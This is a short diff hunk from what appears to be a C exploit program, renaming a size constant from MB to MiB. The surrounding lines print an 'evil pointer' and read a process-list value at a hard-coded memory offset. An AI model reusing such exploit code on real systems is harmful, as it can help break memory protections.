@@ -69,7 +69,7 @@ int main()
 
     printf("Success! Evil pointer: %p\n", ptr);
 
-    u8* base = &ptr[128 * MB];
+    u8* base = &ptr[128 * MiB];
 
     uintptr_t g_processes = *(uintptr_t*)&base[0x1b51c4];
     printf("base = %p\n", base);
